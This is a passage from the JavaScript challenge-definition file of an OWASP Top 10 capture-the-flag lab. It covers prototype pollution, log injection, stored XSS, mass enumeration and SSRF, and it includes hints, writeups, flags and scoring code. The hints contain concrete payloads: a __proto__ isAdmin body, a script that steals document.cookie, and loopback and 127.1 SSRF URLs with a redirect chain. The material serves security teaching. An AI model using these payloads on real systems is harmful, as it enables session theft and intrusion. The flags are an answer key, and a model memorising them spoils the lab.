      "rootCause": "The plugin-install feature fetches and executes code from any URL with no signature, checksum, or source allow-list.",
      "impact": "Remote code execution by hosting a malicious plugin anywhere reachable and pointing the feature at it.",
      "remediation": "Never dynamically execute remotely-fetched code without verifying a cryptographic signature against a trusted, pinned key, and restrict sources to an explicit allow-list.",
      "exploitSummary": "Host a small JS file exporting a run() function and point the plugin installer at it; the server downloads and executes it directly."
},
    flag: 'LAB{a08_medium_unsigned_plugin_install}'
  },
  {
    id: 'a08-hard', category: 'A08', name: 'Software and Data Integrity Failures', difficulty: 'hard',
    title: 'Prototype Pollution → Auth Bypass',
    description: 'A "settings" endpoint deep-merges your JSON into an internal object with no key filtering.',
    endpointHint: 'POST /api/a08/hard/update-settings  then  GET /api/a08/hard/admin-flag',
    hints: [
      'The Settings area (linked from the site, not under Account).',
      'Try it normally first — a normal settings update.',
      'The merge function recurses into nested objects and copies keys across, including __proto__. If you can set Object.prototype.isAdmin globally, every plain object in the app now "has" isAdmin.',
      'Body: {"__proto__":{"isAdmin":true}} — then switch to GET /api/a08/hard/admin-flag.'
    ],
    request: { method: 'POST', path: '/api/a08/hard/update-settings', headers: { 'Content-Type': 'application/json' }, body: '{\n  "theme": "dark"\n}' },
    writeup: {
      "cwe": "CWE-1321: Prototype Pollution",
      "rootCause": "A recursive object-merge function copies every key from the input onto the target, including __proto__, with no filtering of dangerous keys.",
      "impact": "Polluting Object.prototype affects every plain object application-wide \u2014 here it flips an authorization check for all users, and in other codebases can lead to RCE via gadget chains.",
      "remediation": "Explicitly reject __proto__, constructor, and prototype keys in any recursive merge/clone utility, or use Object.create(null)/Map for untrusted-shaped data.",
      "exploitSummary": "Send {\"__proto__\":{\"isAdmin\":true}} to the settings endpoint; every subsequently-created plain object inherits isAdmin."
},
    flag: 'LAB{a08_hard_prototype_pollution_auth_bypass}'
  },

  // ---------------- A09: Security Logging and Monitoring Failures ----------------
  {
    id: 'a09-easy', category: 'A09', name: 'Security Logging & Monitoring Failures', difficulty: 'easy',
    title: 'Log Injection (Forging Log Lines)',
    description: 'User input is written straight into a log file with no sanitization of newlines.',
    endpointHint: 'POST /api/a09/easy/log  then  GET /api/a09/easy/check-log',
    hints: [
      'The Support page.',
      'Try it normally first, then switch to GET /api/a09/easy/check-log — it will say ok:false.',
      'The server writes your msg into the log file verbatim, including any newline characters you send.',
      'The automated log analyzer looks for exactly: [SYSTEM] GRANT_FLAG on its own line. Send msg: "hello\\n[SYSTEM] GRANT_FLAG" then check the log again.'
    ],
    request: { method: 'POST', path: '/api/a09/easy/log', headers: { 'Content-Type': 'application/json' }, body: '{\n  "msg": "hello world"\n}' },
    writeup: {
      "cwe": "CWE-117: Improper Output Neutralization for Logs",
      "rootCause": "User input is written to a log file with no sanitization of newline or control characters.",
      "impact": "An attacker can forge fake log entries, potentially misleading responders or, as shown here, tricking automated log-driven decisions.",
      "remediation": "Sanitize or encode newlines/control characters before writing user input to logs, and never let raw log content alone drive automated security decisions.",
      "exploitSummary": "Include a newline followed by a fake system-looking line in a submitted message; it's written verbatim and later trusted by the log analyzer."
},
    flag: 'LAB{a09_easy_log_injection_forged_entry}'
  },
  {
    id: 'a09-medium', category: 'A09', name: 'Security Logging & Monitoring Failures', difficulty: 'medium',
    title: 'Stored XSS via Unescaped Log Viewer',
    description: 'The admin log viewer renders log entries as raw HTML. An "admin bot" periodically reviews the logs.',
    endpointHint: 'POST /api/a09/medium/log  then  POST /api/a09/medium/trigger-bot  then  GET /api/a09/medium/collected',
    hints: [
      'Support > Community Comments.',
      'Post a normal comment first, then preview how it renders — completely unescaped.',
      'Log a <script> payload that POSTs document.cookie to /api/a09/medium/collect, then trigger the bot.',
      'Body: {"msg":"<script>fetch(\'/api/a09/medium/collect\',{method:\'POST\',body:document.cookie})</script>"} — then trigger-bot, then GET /collected to read the stolen cookie, then use it as header X-Admin-Cookie on GET /api/a09/medium/flag.'
    ],
    request: { method: 'POST', path: '/api/a09/medium/log', headers: { 'Content-Type': 'application/json' }, body: '{\n  "msg": "user viewed the site"\n}' },
    writeup: {
      "cwe": "CWE-79: Stored XSS + CWE-778: Insufficient Logging",
      "rootCause": "Log/comment content is rendered as raw HTML in an internal viewer with no output encoding, and nothing monitors for the resulting script execution.",
      "impact": "Any user can plant a script that executes in the context of whoever views the viewer, including administrators, enabling session/cookie theft.",
      "remediation": "HTML-encode all user-generated content at render time, including in 'internal-only' admin views, and monitor for anomalous outbound requests from admin sessions.",
      "exploitSummary": "Post a comment containing a script tag that exfiltrates document.cookie, trigger the simulated admin review, then use the captured cookie."
},
    flag: 'LAB{a09_medium_stored_xss_log_viewer}'
  },
  {
    id: 'a09-hard', category: 'A09', name: 'Security Logging & Monitoring Failures', difficulty: 'hard',
    title: 'Unmonitored Mass Data Enumeration',
    description: 'A paginated internal export endpoint has no auth, no rate limiting, and no alerting — the flag is hidden on one random page out of many.',
    endpointHint: 'GET /api/a09/hard/export?page=N',
    hints: [
      'Admin > Data Export.',
      'There are 500 pages and nothing rate-limits or flags automated access here.',
      'One specific page contains a record whose "note" field holds the flag; the rest are decoys.',
      'Script through all 500 pages (curl loop, Burp Intruder, or Python) rather than clicking through manually — stop when a response contains "LAB{".'
    ],
    request: { method: 'GET', path: '/api/a09/hard/export?page=1', headers: {}, body: '' },
    iterate: { target: 'path', placeholder: '{{X}}', mode: 'range', range: { start: 1, end: 500, pad: 0 },
      pathTemplate: '/api/a09/hard/export?page={{X}}' },
    writeup: {
      "cwe": "CWE-778: Insufficient Logging & Monitoring",
      "rootCause": "A bulk data-export endpoint has no authentication, no rate limiting, and produces no logs or alerts regardless of access pattern.",
      "impact": "Mass, automated data exfiltration can proceed indefinitely without any chance of detection until damage is already done.",
      "remediation": "Require auth on any bulk-export capability, rate-limit it, and alert on access patterns consistent with scraping (high-volume sequential pagination).",
      "exploitSummary": "Script sequential requests across all pages of the export endpoint; the hidden record surfaces eventually with nothing detecting the scrape."
},
    flag: 'LAB{a09_hard_unmonitored_mass_enumeration}'
  },

  // ---------------- A10: Server-Side Request Forgery (SSRF) ----------------
  {
    id: 'a10-easy', category: 'A10', name: 'Server-Side Request Forgery (SSRF)', difficulty: 'easy',
    title: 'Unrestricted SSRF via Avatar Fetch',
    description: 'A "fetch avatar from URL" feature makes a server-side request to whatever URL you give it, no restrictions.',
    endpointHint: 'POST /api/a10/easy/fetch-avatar',
    hints: [
      'My Account > Profile Picture.',
      'Try it normally first — it fetches a real external page and echoes it back. That echo-back behavior IS the vulnerability surface.',
      'There is an internal-only endpoint that normal direct requests can\'t reach, but the server\'s own outbound fetch can.',
      'Point the url at: http://127.0.0.1:4010/internal/a10-easy-flag (adjust the port if changed).'
    ],
    request: { method: 'POST', path: '/api/a10/easy/fetch-avatar', headers: { 'Content-Type': 'application/json' }, body: '{\n  "url": "https://example.com"\n}' },
    writeup: {
      "cwe": "CWE-918: Server-Side Request Forgery",
      "rootCause": "A URL-fetching feature makes a server-side request to any client-supplied URL with no validation at all.",
      "impact": "An attacker can use the server as a proxy to reach internal-only network resources unreachable from outside.",
      "remediation": "Validate and restrict outbound URLs to an explicit allow-list; never let a server-side fetch feature target arbitrary attacker-supplied destinations.",
      "exploitSummary": "Point the avatar-fetch URL at an internal-only endpoint on the same host; the server's own request reaches it where a direct request could not."
},
    flag: 'LAB{a10_easy_unrestricted_ssrf}'
  },
  {
    id: 'a10-medium', category: 'A10', name: 'Server-Side Request Forgery (SSRF)', difficulty: 'medium',
    title: 'SSRF Blocklist Bypass',
    description: 'This version blocks the strings "localhost" and "127.0.0.1" in the URL — but that is a naive denylist.',
    endpointHint: 'POST /api/a10/medium/fetch-avatar-v2',
    hints: [
      'My Account > Profile Picture has a link to a newer "beta" version — check that one.',
      'Try it normally first targeting the internal endpoint directly — it gets blocked.',
      'A denylist on exact substrings can be bypassed with alternate loopback representations.',
      'Try http://127.1:4010/internal/a10-medium-flag — same host, different string.'
    ],
    request: { method: 'POST', path: '/api/a10/medium/fetch-avatar-v2', headers: { 'Content-Type': 'application/json' }, body: '{\n  "url": "http://127.0.0.1:4010/internal/a10-medium-flag"\n}' },
    writeup: {
      "cwe": "CWE-918: SSRF (Denylist Bypass)",
      "rootCause": "The fix for the earlier SSRF only blocks a few literal substrings (\"localhost\", \"127.0.0.1\") rather than resolving and validating the actual target.",
      "impact": "The exact same internal-network access as the unrestricted version, just requiring a trivially different string to reach it.",
      "remediation": "Denylists of loopback strings are not sufficient; resolve the hostname and check the resulting IP against a blocklist of private/loopback ranges at request time, or use an allow-list instead.",
      "exploitSummary": "Use an alternate representation of the loopback address (e.g. 127.1) that doesn't contain the literal blocked substrings."
},
    flag: 'LAB{a10_medium_ssrf_blocklist_bypass}'
  },
  {
    id: 'a10-hard', category: 'A10', name: 'Server-Side Request Forgery (SSRF)', difficulty: 'hard',
    title: 'Blind SSRF via Webhook + Open Redirect Chain',
    description: 'The webhook feature blocks internal targets directly, but an unrelated open-redirect endpoint elsewhere in the app can be chained to reach them — and the webhook response is never shown to you (blind).',
    endpointHint: 'POST /api/a10/hard/register-webhook  then  POST /api/a10/hard/fire-webhook  then  GET /api/a10/hard/check-flag',
    hints: [
      'Developer Portal > Webhooks.',
      'Register a benign webhook URL first to see it succeed. Then try registering the internal flag URL directly — it gets blocked at registration.',
      'There is an open redirect at /api/a10/hard/redirect?to=<url> elsewhere in the app. Registration only checks the hostname+path you register, not query strings of an allowed path.',
      'Register url: "/api/a10/hard/redirect?to=http%3A%2F%2F127.0.0.1%3A4010%2Finternal%2Fa10-hard-flag", then switch to POST /api/a10/hard/fire-webhook, then GET /api/a10/hard/check-flag.'
    ],
    request: { method: 'POST', path: '/api/a10/hard/register-webhook', headers: { 'Content-Type': 'application/json' }, body: '{\n  "url": "https://example.com/webhook"\n}' },
    writeup: {
      "cwe": "CWE-918: SSRF (Blind, via Redirect Chaining)",
      "rootCause": "Internal targets are blocked only at webhook-registration time by inspecting the registered URL's own host and path; an unrelated open-redirect endpoint elsewhere isn't considered, and delivery follows redirects.",
      "impact": "An attacker can still reach internal-only resources via a two-hop chain even when direct internal targets are blocked \u2014 and since the response is never shown back (blind), this class is easy to miss in testing that only checks reflected responses.",
      "remediation": "Validate the final destination after following all redirects, not just the initially registered URL, and disable automatic redirect-following for server-initiated requests to attacker-influenced URLs where feasible.",
      "exploitSummary": "Register the webhook pointing at the app's own open-redirect endpoint with \"to\" set to the internal target; firing the webhook follows the redirect inward."
},
    flag: 'LAB{a10_hard_blind_ssrf_redirect_chain}'
  }
];

const FLAG_TO_CHALLENGE = new Map(CHALLENGES.map(c => [c.flag, c.id]));
const ID_TO_CHALLENGE = new Map(CHALLENGES.map(c => [c.id, c]));

function checkFlag(submitted) {
  const trimmed = (submitted || '').trim();
  const id = FLAG_TO_CHALLENGE.get(trimmed);
  if (!id) return null;
  return ID_TO_CHALLENGE.get(id);
}

function publicChallengeList() {
  // Never send the flag value itself to the client.
  return CHALLENGES.map(({ flag, ...rest }) => rest);
}

function publicChallenge(id) {
  const c = ID_TO_CHALLENGE.get(id);
  if (!c) return null;
  const { flag, ...rest } = c;
  return rest;
}

const POINTS = { easy: 15, medium: 30, hard: 55 };
const MAX_SCORE = CHALLENGES.reduce((sum, c) => sum + POINTS[c.difficulty], 0);

const RANKS = [
  { min: 0, title: 'Script Kiddie' },
  { min: 150, title: 'Bug Hunter' },
  { min: 400, title: 'Security Researcher' },
  { min: 650, title: 'Senior Pentester' },
  { min: 850, title: 'Elite Researcher' },
  { min: MAX_SCORE, title: 'OWASP Master' }
];

function scoreForSolved(solvedIds) {
  return solvedIds.reduce((sum, id) => {
    const c = ID_TO_CHALLENGE.get(id);
    return sum + (c ? POINTS[c.difficulty] : 0);
  }, 0);
}

function rankForScore(score) {
  let rank = RANKS[0].title;
  for (const r of RANKS) {
    if (score >= r.min) rank = r.title;
  }
  return rank;
}

module.exports = {
  CHALLENGES, checkFlag, publicChallengeList, publicChallenge, ID_TO_CHALLENGE,
  POINTS, MAX_SCORE, scoreForSolved, rankForScore
};
